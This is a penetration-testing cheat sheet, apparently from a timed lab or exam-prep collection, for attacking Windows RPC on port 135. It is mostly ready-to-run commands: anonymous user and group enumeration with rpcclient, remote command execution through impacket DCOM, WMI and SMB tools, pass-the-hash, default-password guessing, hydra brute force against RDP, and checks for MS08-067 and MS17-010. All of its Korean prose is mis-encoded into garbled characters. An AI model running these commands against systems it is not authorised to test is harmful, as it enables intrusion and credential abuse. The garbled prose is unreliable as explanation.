# ğŸ”§ RPC ATTACKS (Port 135)

> **ëª©í‘œ: RPC ì„œë¹„ìŠ¤ ë°œê²¬ í›„ 15-20ë¶„ ë‚´ì— Windows ì‹œìŠ¤í…œ ì •ë³´ ì™„ì „ ìˆ˜ì§‘ ë° ì¶”ê°€ ê³µê²© ë²¡í„° ì‹ë³„**

## âš¡ ì¦‰ì‹œ ì‹¤í–‰í•  ëª…ë ¹ì–´ë“¤

### ğŸš€ RPC ë°œê²¬ ì¦‰ì‹œ ì‹¤í–‰

```bash
# 1. RPC ì„œë¹„ìŠ¤ ê¸°ë³¸ í™•ì¸
nmap -sV -p 135 {IP}
nc -nv {IP} 135

# 2. RPC NSE ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
nmap --script msrpc-enum -p 135 {IP}
nmap --script rpc-grind -p 135 {IP}

# 3. RPC ì—”ë“œí¬ì¸íŠ¸ ì—´ê±°
rpcinfo -p {IP}
rpcclient -U "" -N {IP}

# 4. impacket ë„êµ¬ë¥¼ ì´ìš©í•œ RPC ìŠ¤ìº”
impacket-rpcmap {IP}

# 5. ê´€ë ¨ í¬íŠ¸ë“¤ í•¨ê»˜ ìŠ¤ìº”
nmap -p 135,445,139,593,1024-1030 {IP}
```

### âš¡ Windows ì‹œìŠ¤í…œ í™•ì¸ (RPCëŠ” ì£¼ë¡œ Windows)

```bash
# SMBì™€ í•¨ê»˜ í™•ì¸ (Windows í™˜ê²½)
smbclient -L //{IP} -N
enum4linux -a {IP}

# ë‹¤ë¥¸ Windows ì„œë¹„ìŠ¤ í™•ì¸
nmap -p 135,139,445,3389,5985 {IP}

# WMI ì„œë¹„ìŠ¤ í™•ì¸ (RPC ê¸°ë°˜)
impacket-wmiexec {IP}
```

---

## ğŸ“‹ ë‹¨ê³„ë³„ ì²´í¬ë¦¬ìŠ¤íŠ¸

### ğŸ¯ Phase 1: ë°œê²¬ ë° ê¸°ë³¸ ì •ë³´ ìˆ˜ì§‘ (5ë¶„)

- [ ] **RPC í¬íŠ¸ í™•ì¸** `nmap -p 135 {IP}`
- [ ] **RPC ì„œë¹„ìŠ¤ ë²„ì „ í™•ì¸** `nmap -sV -p 135 {IP}`
- [ ] **ìš´ì˜ì²´ì œ í™•ì¸** (RPCëŠ” ì£¼ë¡œ Windows)
- [ ] **ê´€ë ¨ í¬íŠ¸ë“¤ í™•ì¸** (139, 445, 593)
- [ ] **RPC ì—”ë“œí¬ì¸íŠ¸ ë§¤í¼ ì ‘ê·¼ ì‹œë„**

### ğŸ” Phase 2: RPC ì„œë¹„ìŠ¤ ì—´ê±° (7ë¶„)

- [ ] **RPC ì—”ë“œí¬ì¸íŠ¸ ëª©ë¡ ìˆ˜ì§‘** `rpcinfo -p`
- [ ] **ìµëª… RPC ì—°ê²° ì‹œë„** `rpcclient -U "" -N`
- [ ] **DCOM ì„œë¹„ìŠ¤ í™•ì¸**
- [ ] **WMI ì„œë¹„ìŠ¤ í™•ì¸**
- [ ] **ë‹¤ë¥¸ RPC ì„œë¹„ìŠ¤ë“¤ ë§¤í•‘**

### ğŸ’¥ Phase 3: ê³µê²© ë° ìµìŠ¤í”Œë¡œì‡ (5ë¶„)

- [ ] **DCOM ê³µê²© ì‹œë„**
- [ ] **RPC ì·¨ì•½ì  í™•ì¸**
- [ ] **ì¸ì¦ ìš°íšŒ ì‹œë„**
- [ ] **ë‹¤ë¥¸ ì„œë¹„ìŠ¤ì™€ ì—°ê³„ ê³µê²©**
- [ ] **í¬ë ˆë´ì…œ ê¸°ë°˜ RPC ì ‘ê·¼**

### ğŸ“Š Phase 4: ì •ë³´ í™œìš© (3ë¶„)

- [ ] **ìˆ˜ì§‘ëœ ì„œë¹„ìŠ¤ ì •ë³´ ì •ë¦¬**
- [ ] **ë‹¤ìŒ ê³µê²© ìš°ì„ ìˆœìœ„ ê²°ì •**
- [ ] **SMB/WMI ë“± ì—°ê³„ ì„œë¹„ìŠ¤ ê³µê²© ì¤€ë¹„**
- [ ] **ë°œê²¬ëœ ì·¨ì•½ì  ìµìŠ¤í”Œë¡œì‡ ê³„íš**

---

## ğŸ¯ ìƒí™©ë³„ ëŒ€ì‘

### ğŸ” RPC ì—”ë“œí¬ì¸íŠ¸ ì—´ê±°

```bash
# rpcinfoë¥¼ ì´ìš©í•œ ì—”ë“œí¬ì¸íŠ¸ ì—´ê±°
rpcinfo -p {IP}
rpcinfo -T tcp {IP}

# rpcclientë¥¼ ì´ìš©í•œ ìµëª… ì ‘ê·¼
rpcclient -U "" -N {IP}
# ì—°ê²° ì„±ê³µì‹œ:
srvinfo
enumdomusers
enumdomgroups
queryuser 500
queryuser 501

# nmap NSE ìŠ¤í¬ë¦½íŠ¸
nmap --script msrpc-enum -p 135 {IP}
nmap --script rpc-grind -p 135 {IP}

# impacket-rpcmapìœ¼ë¡œ ìƒì„¸ ì •ë³´
impacket-rpcmap {IP} -p 135
impacket-rpcmap {IP} -p 135 -brute-opnums
```

### ğŸ–¥ï¸ DCOM ê³µê²© (í¬íŠ¸ 135 í™œìš©)

```bash
# DCOM ì„œë¹„ìŠ¤ í™•ì¸
impacket-dcomexec {IP}
impacket-dcomexec {USERNAME}:{PASSWORD}@{IP}

# MMC20.Applicationì„ ì´ìš©í•œ ì‹¤í–‰
impacket-dcomexec {USERNAME}:{PASSWORD}@{IP} -object MMC20
impacket-dcomexec {USERNAME}:{PASSWORD}@{IP} -object ShellWindows
impacket-dcomexec {USERNAME}:{PASSWORD}@{IP} -object ShellBrowserWindow

# ìµëª… DCOM ì‹œë„
impacket-dcomexec -no-pass {IP}

# DCOM ì—´ê±°
#!/bin/bash
dcom_objects=("MMC20.Application" "ShellWindows" "ShellBrowserWindow" "Excel.Application" "Word.Application")
for obj in "${dcom_objects[@]}"; do
    echo "Testing DCOM object: $obj"
    impacket-dcomexec {USERNAME}:{PASSWORD}@{IP} -object $obj
done
```

### ğŸŒ WMI ê³µê²© (RPC ê¸°ë°˜)

```bash
# WMI ì—°ê²° ì‹œë„
impacket-wmiexec {USERNAME}:{PASSWORD}@{IP}
impacket-wmiexec -hashes {HASH} {USERNAME}@{IP}

# ìµëª… WMI ì‹œë„
impacket-wmiexec -no-pass {IP}

# WMI ì •ë³´ ìˆ˜ì§‘
impacket-wmiquery {USERNAME}:{PASSWORD}@{IP} "SELECT * FROM Win32_ComputerSystem"
impacket-wmiquery {USERNAME}:{PASSWORD}@{IP} "SELECT * FROM Win32_OperatingSystem"
impacket-wmiquery {USERNAME}:{PASSWORD}@{IP} "SELECT * FROM Win32_UserAccount"

# WMIë¥¼ í†µí•œ ëª…ë ¹ ì‹¤í–‰
impacket-wmiexec {USERNAME}:{PASSWORD}@{IP} "whoami"
impacket-wmiexec {USERNAME}:{PASSWORD}@{IP} "ipconfig"
```

### ğŸ” ì¸ì¦ëœ RPC ì ‘ê·¼ (í¬ë ˆë´ì…œ ìˆëŠ” ê²½ìš°)

```bash
# ìœ íš¨í•œ í¬ë ˆë´ì…œë¡œ RPC ì ‘ê·¼
rpcclient -U {USERNAME} {IP}
# Password ì…ë ¥ í›„:
srvinfo
enumdomusers
enumdomgroups
enumprinters
enumprivs

# ì‚¬ìš©ì ì •ë³´ ìƒì„¸ ì¡°íšŒ
queryuser {RID}
querygroup {RID}
querygroupmem {RID}

# ë„ë©”ì¸ ì •ë³´ ìˆ˜ì§‘
querydominfo
enumdomains
lookupsids S-1-5-21-domain-500

# ê³µìœ  í´ë” ì—´ê±°
netshareenum
netshareenumall
```

### ğŸ“‹ RPC ì„œë¹„ìŠ¤ë³„ ê³µê²©

#### MS-RPC ì·¨ì•½ì  (íŠ¹ì • ë²„ì „)

```bash
# MS08-067 (Conficker) í™•ì¸
nmap --script smb-vuln-ms08-067 -p 445 {IP}

# MS17-010 (EternalBlue) í™•ì¸
nmap --script smb-vuln-ms17-010 -p 445 {IP}

# MS06-040 Server Service ì·¨ì•½ì 
nmap --script smb-vuln-ms06-025 -p 445 {IP}

# RPC DCOM ì·¨ì•½ì  (MS03-026)
nmap --script msrpc-enum -p 135 {IP}
```

#### DCERPC ì¸í„°í˜ì´ìŠ¤ ê³µê²©

```bash
# íŠ¹ì • RPC ì¸í„°í˜ì´ìŠ¤ í…ŒìŠ¤íŠ¸
impacket-rpcdump {IP}
impacket-rpcdump {USERNAME}:{PASSWORD}@{IP}

# ì•Œë ¤ì§„ RPC ì¸í„°í˜ì´ìŠ¤ë“¤
# SAMR (Security Account Manager)
# LSARPC (Local Security Authority)
# WINREG (Windows Registry)
# WKSSVC (Workstation Service)

# ìˆ˜ë™ RPC ì¸í„°í˜ì´ìŠ¤ í˜¸ì¶œ
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{IP}', 135))
s.send(b'RPC_REQUEST_HERE')
print(s.recv(1024))
s.close()
"
```

---

## ğŸš¨ ë¬¸ì œ í•´ê²°

### ğŸš« RPC ì—°ê²° ê±°ë¶€ì‹œ

```bash
# ë‹¤ë¥¸ RPC ê´€ë ¨ í¬íŠ¸ í™•ì¸
nmap -p 135,593,1024-1030,1025-1035 {IP}

# ë°©í™”ë²½ ìš°íšŒ ì‹œë„
nmap -sS -p 135 {IP}
nmap -sA -p 135 {IP}

# ë‹¤ë¥¸ ì¸í„°í˜ì´ìŠ¤ë¡œ ì—°ê²° ì‹œë„
rpcclient -U "" {IP} -p 593
nc -nv {IP} 593
```

### ğŸ”’ ìµëª… ì ‘ê·¼ ì‹¤íŒ¨ì‹œ

```bash
# ë‹¤ë¥¸ ì‚¬ìš©ìëª…ìœ¼ë¡œ ì‹œë„
rpcclient -U guest -N {IP}
rpcclient -U anonymous -N {IP}

# null ì„¸ì…˜ ì‹œë„
smbclient -L //{IP} -N
enum4linux -a {IP}

# ê¸°ë³¸ í¬ë ˆë´ì…œ ì‹œë„
rpcclient -U administrator {IP}
# Password: (empty), password, admin, 123456

rpcclient -U guest {IP}
# Password: (empty), guest
```

### ğŸ” ì •ë³´ ìˆ˜ì§‘ ê²°ê³¼ê°€ ë¶€ì¡±í•  ë•Œ

```bash
# ë” ìƒì„¸í•œ NSE ìŠ¤í¬ë¦½íŠ¸
nmap --script "msrpc-enum or rpc-grind" -p 135 {IP}
nmap --script "default or safe" -p 135 {IP}

# enum4linuxë¡œ ì¢…í•© ì •ë³´ ìˆ˜ì§‘
enum4linux -a {IP}
enum4linux -v {IP}

# SMBì™€ ì—°ê³„í•˜ì—¬ ì •ë³´ ìˆ˜ì§‘
smbmap -H {IP}
smbclient -L //{IP} -N
```

### ğŸŒ RPC ì‘ë‹µì´ ëŠë¦´ ë•Œ

```bash
# íƒ€ì„ì•„ì›ƒ ì¡°ì •
rpcclient -U "" -N {IP} -t 30

# ë³‘ë ¬ ì²˜ë¦¬ë¡œ ë¹ ë¥¸ í™•ì¸
#!/bin/bash
rpc_commands=("srvinfo" "enumdomusers" "enumdomgroups" "enumprinters")
for cmd in "${rpc_commands[@]}"; do
    echo "$cmd" | rpcclient -U "" -N {IP} &
done
wait
```

### ğŸ”§ RPC ë„êµ¬ ì„¤ì¹˜ ë¬¸ì œ

```bash
# í•„ìš”í•œ íŒ¨í‚¤ì§€ ì„¤ì¹˜ í™•ì¸
sudo apt update
sudo apt install rpcbind
sudo apt install samba-common-bin
sudo apt install enum4linux

# impacket ì„¤ì¹˜ í™•ì¸
pip3 install impacket
sudo apt install python3-impacket

# rpcclient ê²½ë¡œ í™•ì¸
which rpcclient
which rpcinfo
```

---

## ğŸ”— ë‹¤ë¥¸ ì„œë¹„ìŠ¤ì™€ ì—°ê³„

### ğŸ—‚ï¸ SMBì™€ ì—°ê³„ (445 í¬íŠ¸)

```bash
# RPCë¡œ ìˆ˜ì§‘í•œ ì‚¬ìš©ìë¡œ SMB ì ‘ê·¼
smbclient -L //{IP} -U {DISCOVERED_USER}
smbmap -H {IP} -u {DISCOVERED_USER}

# RPCì—ì„œ ë°œê²¬í•œ ê³µìœ ë¡œ ì ‘ê·¼
smbclient //{IP}/{DISCOVERED_SHARE} -U {DISCOVERED_USER}

# Pass-the-Hash ê³µê²© ì—°ê³„
impacket-smbexec -hashes {HASH} {USERNAME}@{IP}
```

### ğŸŒ WMIì™€ ì—°ê³„ (RPC ê¸°ë°˜)

```bash
# RPC ì •ë³´ë¡œ WMI ì ‘ê·¼
impacket-wmiexec {USERNAME}:{PASSWORD}@{IP}

# WMI ëª…ë ¹ ì‹¤í–‰
impacket-wmiexec {USERNAME}:{PASSWORD}@{IP} "net user"
impacket-wmiexec {USERNAME}:{PASSWORD}@{IP} "net localgroup administrators"
```

### ğŸ–¥ï¸ RDPì™€ ì—°ê³„ (3389 í¬íŠ¸)

```bash
# RPCì—ì„œ ìˆ˜ì§‘í•œ ì‚¬ìš©ìë¡œ RDP ì ‘ê·¼
rdesktop {IP} -u {DISCOVERED_USER}
xfreerdp /u:{DISCOVERED_USER} /p:{PASSWORD} /v:{IP}

# RDP ë¸Œë£¨íŠ¸í¬ìŠ¤ (RPCì—ì„œ ìˆ˜ì§‘í•œ ì‚¬ìš©ì ëª©ë¡ í™œìš©)
hydra -L discovered_users.txt -P passwords.txt rdp://{IP}
```

### ğŸ” LDAPê³¼ ì—°ê³„ (389 í¬íŠ¸)

```bash
# RPCì—ì„œ ìˆ˜ì§‘í•œ ë„ë©”ì¸ ì •ë³´ë¡œ LDAP ì ‘ê·¼
ldapsearch -x -h {IP} -b "DC=domain,DC=com"
ldapsearch -x -h {IP} -D "{DISCOVERED_USER}" -w {PASSWORD}
```

---

## ğŸ¯ Windows í™˜ê²½ë³„ RPC ê³µê²©

### ğŸ¢ ë„ë©”ì¸ í™˜ê²½

```bash
# ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ í™•ì¸
rpcclient -U "" -N {IP}
querydominfo
enumdomains

# ë„ë©”ì¸ ì‚¬ìš©ì ì—´ê±°
enumdomusers
for i in {500..1010}; do queryuser $i; done

# ë„ë©”ì¸ ê·¸ë£¹ ì—´ê±°
enumdomgroups
querygroupmem 512  # Domain Admins
querygroupmem 513  # Domain Users
```

### ğŸ–¥ï¸ ì›Œí¬ê·¸ë£¹ í™˜ê²½

```bash
# ë¡œì»¬ ì‚¬ìš©ì ì—´ê±°
rpcclient -U "" -N {IP}
enumdomusers
lookupnames administrator
lookupnames guest

# ë¡œì»¬ ê·¸ë£¹ í™•ì¸
enumdomgroups
querygroupmem 544  # Administrators
querygroupmem 545  # Users
```

### ğŸ”§ íŠ¹ì • Windows ë²„ì „ë³„

```bash
# Windows XP/2003 (MS06-040)
nmap --script smb-vuln-ms06-025 -p 445 {IP}

# Windows 7/2008 (MS08-067)
nmap --script smb-vuln-ms08-067 -p 445 {IP}

# Windows 7/2008/2012 (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 {IP}
```

---

## ğŸ› ï¸ RPC ì „ë¬¸ ë„êµ¬ í™œìš©

### ğŸ“Š Impacket ë„êµ¬ ëª¨ìŒ

```bash
# í¬ê´„ì ì¸ RPC ìŠ¤ìº”
impacket-rpcdump {IP}
impacket-rpcmap {IP}

# ì„œë¹„ìŠ¤ë³„ ì ‘ê·¼
impacket-smbexec {USERNAME}:{PASSWORD}@{IP}
impacket-wmiexec {USERNAME}:{PASSWORD}@{IP}
impacket-dcomexec {USERNAME}:{PASSWORD}@{IP}

# í•´ì‹œ í™œìš©
impacket-wmiexec -hashes {NTLM_HASH} {USERNAME}@{IP}
impacket-smbexec -hashes {NTLM_HASH} {USERNAME}@{IP}
```

### ğŸ” enum4linux ì‹¬í™” í™œìš©

```bash
# ì „ì²´ ì—´ê±°
enum4linux -a {IP}

# íŠ¹ì • ì •ë³´ë§Œ ìˆ˜ì§‘
enum4linux -U {IP}  # Users only
enum4linux -S {IP}  # Shares only
enum4linux -G {IP}  # Groups only
enum4linux -P {IP}  # Password policy

# ìƒì„¸ ëª¨ë“œ
enum4linux -v -a {IP}
```

---

## â±ï¸ ì‹œê°„ ê´€ë¦¬ ê°€ì´ë“œ

### ğŸ¯ 5ë¶„ ì•ˆì— ì™„ë£Œí•  ê²ƒë“¤

- [ ] RPC ì„œë¹„ìŠ¤ ê¸°ë³¸ í™•ì¸
- [ ] ê´€ë ¨ Windows ì„œë¹„ìŠ¤ í¬íŠ¸ ìŠ¤ìº”
- [ ] ìµëª… RPC ì—°ê²° ì‹œë„
- [ ] ê¸°ë³¸ ì •ë³´ ìˆ˜ì§‘ (srvinfo, enumdomusers)

### ğŸ” 15ë¶„ ì•ˆì— ì™„ë£Œí•  ê²ƒë“¤

- [ ] ëª¨ë“  RPC ì—”ë“œí¬ì¸íŠ¸ ì—´ê±°
- [ ] ì‚¬ìš©ì/ê·¸ë£¹ ì™„ì „ ì—´ê±°
- [ ] DCOM/WMI ì„œë¹„ìŠ¤ í™•ì¸
- [ ] ì—°ê³„ ì„œë¹„ìŠ¤(SMB, LDAP) ê¸°ë³¸ í…ŒìŠ¤íŠ¸

### ğŸ’¥ 20ë¶„ í›„ íŒë‹¨ ê¸°ì¤€

**ì„±ê³µ ê¸°ì¤€:**

- [ ] Windows ì‹œìŠ¤í…œ ì‚¬ìš©ì ëª©ë¡ ìˆ˜ì§‘ ì™„ë£Œ
- [ ] ë„ë©”ì¸/ì›Œí¬ê·¸ë£¹ êµ¬ì¡° íŒŒì•…
- [ ] DCOM/WMI ì ‘ê·¼ ê°€ëŠ¥ì„± í™•ì¸
- [ ] ë‹¤ë¥¸ Windows ì„œë¹„ìŠ¤ ì—°ê³„ ê°€ëŠ¥ì„± í™•ì¸

**ì‹¤íŒ¨ì‹œ ë‹¤ìŒ ë‹¨ê³„:**

- [ ] ìˆ˜ì§‘í•œ ì‚¬ìš©ì ì •ë³´ë¥¼ ë‹¤ë¥¸ ì„œë¹„ìŠ¤ì— í™œìš©
- [ ] SMB ì„œë¹„ìŠ¤(139/445)ë¡œ ìš°ì„ ìˆœìœ„ ì´ë™
- [ ] RDP ì„œë¹„ìŠ¤(3389) í™•ì¸
- [ ] ê¸°ë³¸ í¬ë ˆë´ì…œë¡œ ë‹¤ë¥¸ ì„œë¹„ìŠ¤ ì‹œë„

**ë‹¤ìŒ ë‹¨ê³„**:

- Windows í™˜ê²½ í™•ì¸ë˜ë©´ `PORT-ATTACKS/139-445-smb.md`ë¡œ
- í¬ë ˆë´ì…œ ìˆ˜ì§‘ë˜ë©´ í•´ë‹¹ ì •ë³´ë¡œ ë‹¤ë¥¸ ì„œë¹„ìŠ¤ ê³µê²©
- RDP ë°œê²¬ë˜ë©´ `PORT-ATTACKS/3389-rdp.md`ë¡œ
- ì‹¤íŒ¨ì‹œ ë‹¤ë¥¸ `PORT-ATTACKS/` íŒŒì¼ë¡œ ì´ë™
